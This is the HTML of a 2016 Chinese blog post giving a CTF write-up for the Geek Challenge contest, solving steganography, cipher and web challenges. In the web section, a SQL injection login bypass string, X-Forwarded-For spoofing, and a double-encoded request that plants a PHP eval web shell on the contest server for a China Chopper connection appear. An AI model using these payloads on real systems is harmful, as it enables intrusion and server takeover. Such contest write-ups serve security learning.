@@ -1,0 +1,585 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="misc闪得好快链接打开是一个下载的链接，下载解压之后是一个gif图，把gif图给分解掉，分成一帧一帧的，用手机扫下二维码就出来答案啦。
+come_game是一个小游戏，在打开游戏之后会出现deathtime，save2这两个文件，玩了几关之后会发现小人死了几次，deathtime中的二进制数据就会有所改变。并且改变save2中第02位的数据，将32改成33时，游戏进入下一关，改成35时flag就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="极客大挑战 write up">
+<meta property="og:url" content="http://yoursite.com/2016/10/23/极客大挑战 write up/index.html">
+<meta property="og:site_name" content="Dream-n">
+<meta property="og:description" content="misc闪得好快链接打开是一个下载的链接，下载解压之后是一个gif图，把gif图给分解掉，分成一帧一帧的，用手机扫下二维码就出来答案啦。
+come_game是一个小游戏，在打开游戏之后会出现deathtime，save2这两个文件，玩了几关之后会发现小人死了几次，deathtime中的二进制数据就会有所改变。并且改变save2中第02位的数据，将32改成33时，游戏进入下一关，改成35时flag就">
+<meta property="og:updated_time" content="2016-10-23T10:06:19.009Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="极客大挑战 write up">
+<meta name="twitter:description" content="misc闪得好快链接打开是一个下载的链接，下载解压之后是一个gif图，把gif图给分解掉，分成一帧一帧的，用手机扫下二维码就出来答案啦。
+come_game是一个小游戏，在打开游戏之后会出现deathtime，save2这两个文件，玩了几关之后会发现小人死了几次，deathtime中的二进制数据就会有所改变。并且改变save2中第02位的数据，将32改成33时，游戏进入下一关，改成35时flag就">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"right","display":"hide"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/10/23/极客大挑战 write up/"/>
+
+  <title> 极客大挑战 write up | Dream-n </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Dream-n</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">月落乌啼霜满天</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                极客大挑战 write up
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-10-23T18:06:19+08:00" content="2016-10-23">
+              2016-10-23
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="闪得好快"><a href="#闪得好快" class="headerlink" title="闪得好快"></a>闪得好快</h4><p>链接打开是一个下载的链接，下载解压之后是一个gif图，把gif图给分解掉，分成一帧一帧的，用手机扫下二维码就出来答案啦。</p>
+<h4 id="come-game"><a href="#come-game" class="headerlink" title="come_game"></a>come_game</h4><p>是一个小游戏，在打开游戏之后会出现deathtime，save2这两个文件，玩了几关之后会发现小人死了几次，deathtime中的二进制数据就会有所改变。并且改变save2中第02位的数据，将32改成33时，游戏进入下一关，改成35时flag就出来了。</p>
+<h4 id="snow"><a href="#snow" class="headerlink" title="snow"></a>snow</h4><p>snow这道题提示是HTML隐写，搜了一下是一种叫snow的隐写术，找到了一个解密的网站<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html" target="_blank" rel="external">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a>，把网址和key输进去，flag就出来了。</p>
+<h4 id="旋转跳跃"><a href="#旋转跳跃" class="headerlink" title="旋转跳跃"></a>旋转跳跃</h4><p>下载下来是一个MP3文件，MP3文件也是可以隐藏文件的，用MP3stego将文件导出来就行了。<br>这个工具一定要放在桌面上才能正常运行。使用方式如下：<a href="http://blog.csdn.net/myloveprogrmming/article/details/52641916" target="_blank" rel="external">http://blog.csdn.net/myloveprogrmming/article/details/52641916</a></p>
+<h4 id="凯撒部长的奖励"><a href="#凯撒部长的奖励" class="headerlink" title="凯撒部长的奖励"></a>凯撒部长的奖励</h4><p>是一长串凯撒密码，解密之后就能得到答案。<br>贴一个解密的网站：<a href="http://heartsnote.com/tools/cipher.htm" target="_blank" rel="external">http://heartsnote.com/tools/cipher.htm</a></p>
+<h4 id="MD5cracker"><a href="#MD5cracker" class="headerlink" title="MD5cracker"></a>MD5cracker</h4><p>直接解密有错误，数了一下的确是32位，试了很多方法，把 l 改成 1 就能得出flag。</p>
+<h4 id="PEN-AND-APPLE"><a href="#PEN-AND-APPLE" class="headerlink" title="PEN_AND_APPLE"></a>PEN_AND_APPLE</h4><p>提示是Windows下的type命令，Windows下的type命令可以显示文件内容。 </p>
+<blockquote>
+<p>利用NTFS流文件隐藏</p>
+<p>首先用记事本新建两个文本文档,分别名为“1.txt”“2.txt”,其内容为“正常文件、数据流文件”,打开CMD命令行窗口, 进入两个文件所在文件夹,输入 type 2.txt&gt;1.txt: shujuliu.txt,回车.即可将文件2.txt的内容加入1.txt, 内容以数据流方式保存,该数据流名为shujuliu.txt.在资源管理器中查看宿主文件1.txt,发现文件的修改日期和文件大小 都无变化,现在删除2.txt,执行命令:notepad 1.txt:shujuliu.txt ,即可查看数据流文件中的文件内容了.</p>
+</blockquote>
+<p>用alternatestreamview可以提取出其中的文件，得到flag</p>
+<h4 id="藏着小秘密的流量包"><a href="#藏着小秘密的流量包" class="headerlink" title="藏着小秘密的流量包"></a>藏着小秘密的流量包</h4><p>下载下来的是一个pcapng文件，先试着用wireshark打开了….好吧我看不懂里面都有些什么…旁边的同学实在看不下去了让我放到虚拟机中试试。放到虚拟机里用binwalk将文件提取出来。</p>
+<blockquote>
+<p>ls 查看文件夹包含的文件<br>foremost 使用foremost工具将文件分离出来</p>
+</blockquote>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="web-1"><a href="#web-1" class="headerlink" title="web_1"></a>web_1</h4><p>直接用burpsuite抓包一跑flag就出来了。</p>
+<h4 id="web-2"><a href="#web-2" class="headerlink" title="web_2"></a>web_2</h4><p>用burpsuite抓包之后，有一个whoami，试着改成admin了但是不行，一直提示you are not admin ，后来问过才知道那个guest%40geekgame是个邮箱，把前面的guest改成admin就行了。还有root也要改成1。</p>
+<h4 id="sqli2"><a href="#sqli2" class="headerlink" title="sqli2"></a>sqli2</h4><p>网站打开后是一个登录界面，就知道是一个post注入，尝试着注入但是login failed，用sleep函数试了试发现是’闭合的…但其实没这必要，将debug改成1之后就会有信息出来。<br>用username=admin’ or ‘1’=’1 就可以得到flag。在这里注释符被过滤了。<br>但是username用123或者其他字符都不行，只能用admin。</p>
+<h4 id="127-0-0-x"><a href="#127-0-0-x" class="headerlink" title="127.0.0.x"></a>127.0.0.x</h4><p>这道题与x-forwarded-for头有关。</p>
+<blockquote>
+<p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</p>
+</blockquote>
+<p>在火狐浏览器里安装x-forwarded-for head插件，将IP address改成127.0.0.51<br>题目中的滴滴滴滴的数量就是x的值，多刷新几次会发现滴滴滴滴的数量在变化，试了试51-55之间的数字都可以，只要和页面上滴滴的数量相同就可以了。</p>
+<h4 id="php-is-fun"><a href="#php-is-fun" class="headerlink" title="php_is_fun()"></a>php_is_fun()</h4><p>&lt;?php<br>if(isset($_GET) &amp;&amp; !empty($_GET)){<br>    $url = $_GET[‘file’];<br>    $path = “upload/“.$_GET[‘path’];<br>}else{<br>    show_source(<strong>FILE</strong>);<br>    exit();<br>}</p>
+<p>if(strpos($path,’..’) &gt; -1){<br>    die(‘SYCwaf!’);<br>}</p>
+<p>if(strpos($url,’<a href="http://127.0.0.1/" target="_blank" rel="external">http://127.0.0.1/</a>‘) === 0){<br>    file_put_contents($path, file_get_contents($url));<br>    echo “console.log($path update successed!)”;<br>}else{<br>    echo “Hello.Geeker”;<br>}</p>
+<p>中间if(strpos($path,’..’) &gt; -1)是为了防止path中存在..，也就是为了防止跨文件上传。<br>file_put_contents() 函数把一个字符串写入文件中。<br>file_get_contents() 把整个文件读入一个字符串中。<br>从$url中获取的内容写入到$path中<br>然后用一句话木马</p>
+<blockquote>
+<p><a href="http://game.sycsec.com:50084/?file=http://127.0.0.1/?file=http://127.0.0.1/&amp;path=" target="_blank" rel="external">http://game.sycsec.com:50084/?file=http://127.0.0.1/?file=http://127.0.0.1/&amp;path=</a>&lt;?php eval($_post[‘123’])?&gt;&amp;path=1.php</p>
+</blockquote>
+<p>path这一串需要用url编码，但由于在用get获得参数的时候，本身就会进行一次解码，那么我们的url参数就需要两次编码，但其实有问题的地方就只有空格那里，所以就将%20的%进行一次再编码就行了。</p>
+<p>编码之后是这个样子的：<br><a href="http://game.sycsec.com:50084/?file=http://127.0.0.1/?file=http://127.0.0.1/%26path%3D%3C%3Fphp%2520eval%28%24_post%5B%27123%27%5D%29%3F%3E&amp;path=1.php" target="_blank" rel="external">http://game.sycsec.com:50084/?file=http://127.0.0.1/?file=http://127.0.0.1/%26path%3D%3C%3Fphp%2520eval%28%24_post%5B%27123%27%5D%29%3F%3E&amp;path=1.php</a></p>
+<p>之后再用菜刀连接就可以得到flag。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/10/21/sql注入/" rel="next" title="sql注入">
+                <i class="fa fa-chevron-left"></i> sql注入
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/av.jpeg"
+               alt="嚮佑" />
+          <p class="site-author-name" itemprop="name">嚮佑</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">3</span>
+              <span class="site-state-item-name">Artikel</span>
+            </a>
+          </div>
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#misc"><span class="nav-number">1.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#闪得好快"><span class="nav-number">1.1.</span> <span class="nav-text">闪得好快</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#come-game"><span class="nav-number">1.2.</span> <span class="nav-text">come_game</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#snow"><span class="nav-number">1.3.</span> <span class="nav-text">snow</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#旋转跳跃"><span class="nav-number">1.4.</span> <span class="nav-text">旋转跳跃</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#凯撒部长的奖励"><span class="nav-number">1.5.</span> <span class="nav-text">凯撒部长的奖励</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MD5cracker"><span class="nav-number">1.6.</span> <span class="nav-text">MD5cracker</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PEN-AND-APPLE"><span class="nav-number">1.7.</span> <span class="nav-text">PEN_AND_APPLE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#藏着小秘密的流量包"><span class="nav-number">1.8.</span> <span class="nav-text">藏着小秘密的流量包</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web-1"><span class="nav-number">2.1.</span> <span class="nav-text">web_1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web-2"><span class="nav-number">2.2.</span> <span class="nav-text">web_2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqli2"><span class="nav-number">2.3.</span> <span class="nav-text">sqli2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#127-0-0-x"><span class="nav-number">2.4.</span> <span class="nav-text">127.0.0.x</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-is-fun"><span class="nav-number">2.5.</span> <span class="nav-text">php_is_fun()</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">嚮佑</span>
+</div>
+
+<div class="powered-by">
+  Erstellt mit  <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
